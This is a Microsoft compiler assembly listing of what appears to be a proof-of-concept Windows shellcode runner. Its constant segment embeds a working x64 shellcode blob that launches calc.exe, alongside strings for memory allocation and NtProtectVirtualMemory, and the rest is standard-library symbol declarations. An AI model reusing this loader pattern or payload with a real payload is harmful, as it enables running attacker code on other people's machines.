; Listing generated by Microsoft (R) Optimizing Compiler Version 19.33.31629.0 

include listing.inc

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

CONST	SEGMENT
$SG123900 DB	'NtProtectVirtualMemory', 00H
?_Fake_alloc@std@@3U_Fake_allocator@1@B	ORG $+1		; std::_Fake_alloc
$SG124172 DB	0aH, 'Break1', 00H
$SG124175 DB	'Allocated memory at: ', 00H
	ORG $+2
$SG124176 DB	'Memory allocation failed. Status: 0x', 00H
	ORG $+3
$SG124177 DB	'Base Address of VirtualAlloc: %p', 00H
	ORG $+7
$SG124179 DB	'jumperr', 00H
$SG124178 DB	0fcH, 'H', 083H, 0e4H, 0f0H, 0e8H, 0c0H, 00H, 00H, 00H, 'A'
	DB	'QAPRQVH1', 0d2H, 'eH', 08bH, 'R`H', 08bH, 'R', 018H, 'H', 08bH
	DB	'R H', 08bH, 'rPH', 0fH, 0b7H, 'JJM1', 0c9H, 'H1', 0c0H, 0acH, '<'
	DB	'a|', 02H, ', A', 0c1H, 0c9H, 0dH, 'A', 01H, 0c1H, 0e2H, 0edH, 'R'
	DB	'AQH', 08bH, 'R ', 08bH, 'B<H', 01H, 0d0H, 08bH, 080H, 088H, 00H
	DB	00H, 00H, 'H', 085H, 0c0H, 'tgH', 01H, 0d0H, 'P', 08bH, 'H', 018H
	DB	'D', 08bH, '@ I', 01H, 0d0H, 0e3H, 'VH', 0ffH, 0c9H, 'A', 08bH
	DB	'4', 088H, 'H', 01H, 0d6H, 'M1', 0c9H, 'H1', 0c0H, 0acH, 'A', 0c1H
	DB	0c9H, 0dH, 'A', 01H, 0c1H, '8', 0e0H, 'u', 0f1H, 'L', 03H, 'L$'
	DB	08H, 'E9', 0d1H, 'u', 0d8H, 'XD', 08bH, '@$I', 01H, 0d0H, 'fA', 08bH
	DB	0cH, 'HD', 08bH, '@', 01cH, 'I', 01H, 0d0H, 'A', 08bH, 04H, 088H
	DB	'H', 01H, 0d0H, 'AXAX^YZAXAYAZH', 083H, 0ecH, ' AR', 0ffH, 0e0H
	DB	'XAYZH', 08bH, 012H, 0e9H, 'W', 0ffH, 0ffH, 0ffH, ']H', 0baH, 01H
	DB	00H, 00H, 00H, 00H, 00H, 00H, 00H, 'H', 08dH, 08dH, 01H, 01H, 00H
	DB	00H, 'A', 0baH, '1', 08bH, 'o', 087H, 0ffH, 0d5H, 0bbH, 0f0H, 0b5H
	DB	0a2H, 'VA', 0baH, 0a6H, 095H, 0bdH, 09dH, 0ffH, 0d5H, 'H', 083H
	DB	0c4H, '(<', 06H, '|', 0aH, 080H, 0fbH, 0e0H, 'u', 05H, 0bbH, 'G'
	DB	013H, 'roj', 00H, 'YA', 089H, 0daH, 0ffH, 0d5H, 'calc.exe', 00H
	DB	00H
	ORG $+3
$SG124182 DB	'Memory protection changed successfully.', 00H
$SG124183 DB	'NtProtectVirtualMemory failed. Status: 0x', 00H
CONST	ENDS
PUBLIC	??2@YAPEAX_KPEAX@Z				; operator new
PUBLIC	fabsl
PUBLIC	frexpl
PUBLIC	__local_stdio_printf_options
PUBLIC	_vfprintf_l
PUBLIC	printf
PUBLIC	_vsprintf_s_l
PUBLIC	sprintf_s
PUBLIC	wmemchr
PUBLIC	wmemcmp
PUBLIC	??0exception@std@@QEAA@QEBD@Z			; std::exception::exception
PUBLIC	??0exception@std@@QEAA@QEBDH@Z			; std::exception::exception
PUBLIC	??0exception@std@@QEAA@AEBV01@@Z		; std::exception::exception
PUBLIC	??1exception@std@@UEAA@XZ			; std::exception::~exception
PUBLIC	?what@exception@std@@UEBAPEBDXZ			; std::exception::what
PUBLIC	??_Gexception@std@@UEAAPEAXI@Z			; std::exception::`scalar deleting destructor'
PUBLIC	??0bad_alloc@std@@AEAA@QEBD@Z			; std::bad_alloc::bad_alloc
PUBLIC	??1bad_alloc@std@@UEAA@XZ			; std::bad_alloc::~bad_alloc
PUBLIC	??0bad_alloc@std@@QEAA@AEBV01@@Z		; std::bad_alloc::bad_alloc
PUBLIC	??_Gbad_alloc@std@@UEAAPEAXI@Z			; std::bad_alloc::`scalar deleting destructor'
PUBLIC	??0bad_array_new_length@std@@QEAA@XZ		; std::bad_array_new_length::bad_array_new_length
PUBLIC	??1bad_array_new_length@std@@UEAA@XZ		; std::bad_array_new_length::~bad_array_new_length
PUBLIC	??0bad_array_new_length@std@@QEAA@AEBV01@@Z	; std::bad_array_new_length::bad_array_new_length
PUBLIC	??_Gbad_array_new_length@std@@UEAAPEAXI@Z	; std::bad_array_new_length::`scalar deleting destructor'
PUBLIC	?_Throw_bad_array_new_length@std@@YAXXZ		; std::_Throw_bad_array_new_length
PUBLIC	?max@?$numeric_limits@_J@std@@SA_JXZ		; std::numeric_limits<__int64>::max
PUBLIC	?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ; std::_Default_allocate_traits::_Allocate
PUBLIC	?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z ; std::_Adjust_manually_vector_aligned
PUBLIC	?_Orphan_all@_Container_base0@std@@QEAAXXZ	; std::_Container_base0::_Orphan_all
PUBLIC	?_Swap_proxy_and_iterators@_Container_base0@std@@QEAAXAEAU12@@Z ; std::_Container_base0::_Swap_proxy_and_iterators
PUBLIC	?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy
PUBLIC	?_Adopt@_Iterator_base0@std@@QEAAXPEBX@Z	; std::_Iterator_base0::_Adopt
PUBLIC	??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl
PUBLIC	?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ	; std::_Fake_proxy_ptr_impl::_Release
PUBLIC	?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy
PUBLIC	?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::move
PUBLIC	?compare@?$_WChar_traits@_W@std@@SAHQEB_W0_K@Z	; std::_WChar_traits<wchar_t>::compare
PUBLIC	?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z	; std::_WChar_traits<wchar_t>::length
PUBLIC	?find@?$_WChar_traits@_W@std@@SAPEB_WPEB_W_KAEB_W@Z ; std::_WChar_traits<wchar_t>::find
PUBLIC	?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z	; std::_WChar_traits<wchar_t>::assign
PUBLIC	?to_int_type@?$_WChar_traits@_W@std@@SAGAEB_W@Z	; std::_WChar_traits<wchar_t>::to_int_type
PUBLIC	?eq_int_type@?$_WChar_traits@_W@std@@SA_NAEBG0@Z ; std::_WChar_traits<wchar_t>::eq_int_type
PUBLIC	?eof@?$_WChar_traits@_W@std@@SAGXZ		; std::_WChar_traits<wchar_t>::eof
PUBLIC	?copy@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z	; std::_Char_traits<char,int>::copy
PUBLIC	?move@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z	; std::_Char_traits<char,int>::move
PUBLIC	?compare@?$_Narrow_char_traits@DH@std@@SAHQEBD0_K@Z ; std::_Narrow_char_traits<char,int>::compare
PUBLIC	?length@?$_Narrow_char_traits@DH@std@@SA_KQEBD@Z ; std::_Narrow_char_traits<char,int>::length
PUBLIC	?find@?$_Narrow_char_traits@DH@std@@SAPEBDQEBD_KAEBD@Z ; std::_Narrow_char_traits<char,int>::find
PUBLIC	?assign@?$_Narrow_char_traits@DH@std@@SAPEADQEAD_KD@Z ; std::_Narrow_char_traits<char,int>::assign
PUBLIC	?assign@?$_Narrow_char_traits@DH@std@@SAXAEADAEBD@Z ; std::_Narrow_char_traits<char,int>::assign
PUBLIC	?to_int_type@?$_Narrow_char_traits@DH@std@@SAHAEBD@Z ; std::_Narrow_char_traits<char,int>::to_int_type
PUBLIC	?eq_int_type@?$_Narrow_char_traits@DH@std@@SA_NAEBH0@Z ; std::_Narrow_char_traits<char,int>::eq_int_type
PUBLIC	?eof@?$_Narrow_char_traits@DH@std@@SAHXZ	; std::_Narrow_char_traits<char,int>::eof
PUBLIC	?_Xlen_string@std@@YAXXZ			; std::_Xlen_string
PUBLIC	??0?$allocator@D@std@@QEAA@XZ			; std::allocator<char>::allocator<char>
PUBLIC	?deallocate@?$allocator@D@std@@QEAAXQEAD_K@Z	; std::allocator<char>::deallocate
PUBLIC	?allocate@?$allocator@D@std@@QEAAPEAD_K@Z	; std::allocator<char>::allocate
PUBLIC	?max_size@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SA_KAEBV?$allocator@D@2@@Z ; std::_Default_allocator_traits<std::allocator<char> >::max_size
PUBLIC	?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SA?AV?$allocator@D@2@AEBV32@@Z ; std::_Default_allocator_traits<std::allocator<char> >::select_on_container_copy_construction
PUBLIC	??0?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<char> >::_String_val<std::_Simple_types<char> >
PUBLIC	?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAAPEADXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
PUBLIC	?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBAPEBDXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
PUBLIC	?_Large_string_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<char> >::_Large_string_engaged
PUBLIC	?_Check_offset@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBAX_K@Z ; std::_String_val<std::_Simple_types<char> >::_Check_offset
PUBLIC	?_Xran@?$_String_val@U?$_Simple_types@D@std@@@std@@SAXXZ ; std::_String_val<std::_Simple_types<char> >::_Xran
PUBLIC	??0_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<char> >::_Bxty::_Bxty
PUBLIC	??1_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<char> >::_Bxty::~_Bxty
PUBLIC	??1?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<char> >::~_String_val<std::_Simple_types<char> >
PUBLIC	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@$$QEAV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	??4?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@$$QEAV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator=
PUBLIC	?assign@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@$$QEAV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::assign
PUBLIC	?_Memcpy_val_from@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEBV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Memcpy_val_from
PUBLIC	?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Take_contents
PUBLIC	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@D@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=
PUBLIC	?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@AEBV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
PUBLIC	?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@QEBD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
PUBLIC	?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
PUBLIC	?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@_KD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
PUBLIC	?insert@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@_K0D@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::insert
PUBLIC	?clear@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::clear
PUBLIC	??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator[]
PUBLIC	??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBAAEBD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator[]
PUBLIC	?push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::push_back
PUBLIC	?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBAPEBDXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::c_str
PUBLIC	?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::size
PUBLIC	?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
PUBLIC	?resize@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAX_KD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::resize
PUBLIC	?empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_NXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::empty
PUBLIC	?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::find
PUBLIC	?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CA_K_K00@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
PUBLIC	?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBA_K_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
PUBLIC	?_Eos@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAX_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Eos
PUBLIC	?_Tidy_init@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Tidy_init
PUBLIC	?_Tidy_deallocate@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Tidy_deallocate
PUBLIC	?_Swap_proxy_and_iterators@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Swap_proxy_and_iterators
PUBLIC	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
PUBLIC	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBAAEBV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAAAEAV?$allocator@D@2@XZ ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Get_first
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEBAAEBV?$allocator@D@2@XZ ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Get_first
PUBLIC	??1?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@XZ ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::~_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>
PUBLIC	??0?$allocator@_W@std@@QEAA@XZ			; std::allocator<wchar_t>::allocator<wchar_t>
PUBLIC	?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z	; std::allocator<wchar_t>::deallocate
PUBLIC	?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z	; std::allocator<wchar_t>::allocate
PUBLIC	?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
PUBLIC	?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction
PUBLIC	??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
PUBLIC	?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
PUBLIC	?_Large_string_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_string_engaged
PUBLIC	??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty
PUBLIC	??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty
PUBLIC	??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::~_String_val<std::_Simple_types<wchar_t> >
PUBLIC	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@$$QEAV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@$$QEAV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
PUBLIC	?_Memcpy_val_from@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEBV12@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Memcpy_val_from
PUBLIC	?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Take_contents
PUBLIC	??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::data
PUBLIC	?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size
PUBLIC	?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
PUBLIC	?find@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KAEBV12@_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::find
PUBLIC	?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
PUBLIC	?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
PUBLIC	?_Tidy_init@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_init
PUBLIC	?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate
PUBLIC	?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Swap_proxy_and_iterators
PUBLIC	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
PUBLIC	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::~_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>
PUBLIC	??0runtime_error@std@@QEAA@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ; std::runtime_error::runtime_error
PUBLIC	??1runtime_error@std@@UEAA@XZ			; std::runtime_error::~runtime_error
PUBLIC	??0runtime_error@std@@QEAA@AEBV01@@Z		; std::runtime_error::runtime_error
PUBLIC	??_Gruntime_error@std@@UEAAPEAXI@Z		; std::runtime_error::`scalar deleting destructor'
PUBLIC	?make_error_code@std@@YA?AVerror_code@1@W4io_errc@1@@Z ; std::make_error_code
PUBLIC	?iostream_category@std@@YAAEBVerror_category@1@XZ ; std::iostream_category
PUBLIC	??1error_category@std@@UEAA@XZ			; std::error_category::~error_category
PUBLIC	?default_error_condition@error_category@std@@UEBA?AVerror_condition@2@H@Z ; std::error_category::default_error_condition
PUBLIC	?equivalent@error_category@std@@UEBA_NHAEBVerror_condition@2@@Z ; std::error_category::equivalent
PUBLIC	?equivalent@error_category@std@@UEBA_NAEBVerror_code@2@H@Z ; std::error_category::equivalent
PUBLIC	??8error_category@std@@QEBA_NAEBV01@@Z		; std::error_category::operator==
PUBLIC	??0error_code@std@@QEAA@HAEBVerror_category@1@@Z ; std::error_code::error_code
PUBLIC	?value@error_code@std@@QEBAHXZ			; std::error_code::value
PUBLIC	?category@error_code@std@@QEBAAEBVerror_category@2@XZ ; std::error_code::category
PUBLIC	?message@error_code@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ; std::error_code::message
PUBLIC	??0error_condition@std@@QEAA@HAEBVerror_category@1@@Z ; std::error_condition::error_condition
PUBLIC	?value@error_condition@std@@QEBAHXZ		; std::error_condition::value
PUBLIC	?category@error_condition@std@@QEBAAEBVerror_category@2@XZ ; std::error_condition::category
PUBLIC	??8std@@YA_NAEBVerror_condition@0@0@Z		; std::operator==
PUBLIC	?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z ; std::_System_error::_Makestr
PUBLIC	??0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ; std::_System_error::_System_error
PUBLIC	??1_System_error@std@@UEAA@XZ			; std::_System_error::~_System_error
PUBLIC	??0_System_error@std@@QEAA@AEBV01@@Z		; std::_System_error::_System_error
PUBLIC	??_G_System_error@std@@UEAAPEAXI@Z		; std::_System_error::`scalar deleting destructor'
PUBLIC	??0system_error@std@@QEAA@Verror_code@1@PEBD@Z	; std::system_error::system_error
PUBLIC	??1system_error@std@@UEAA@XZ			; std::system_error::~system_error
PUBLIC	??0system_error@std@@QEAA@AEBV01@@Z		; std::system_error::system_error
PUBLIC	??_Gsystem_error@std@@UEAAPEAXI@Z		; std::system_error::`scalar deleting destructor'
PUBLIC	?name@_Iostream_error_category2@std@@UEBAPEBDXZ	; std::_Iostream_error_category2::name
PUBLIC	?message@_Iostream_error_category2@std@@UEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z ; std::_Iostream_error_category2::message
PUBLIC	??1_Iostream_error_category2@std@@UEAA@XZ	; std::_Iostream_error_category2::~_Iostream_error_category2
PUBLIC	??_G_Iostream_error_category2@std@@UEAAPEAXI@Z	; std::_Iostream_error_category2::`scalar deleting destructor'
PUBLIC	??$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAAEBV_Iostream_error_category2@0@XZ ; std::_Immortalize_memcpy_image<std::_Iostream_error_category2>
PUBLIC	??0bad_cast@std@@QEAA@XZ			; std::bad_cast::bad_cast
PUBLIC	??1bad_cast@std@@UEAA@XZ			; std::bad_cast::~bad_cast
PUBLIC	??0bad_cast@std@@QEAA@AEBV01@@Z			; std::bad_cast::bad_cast
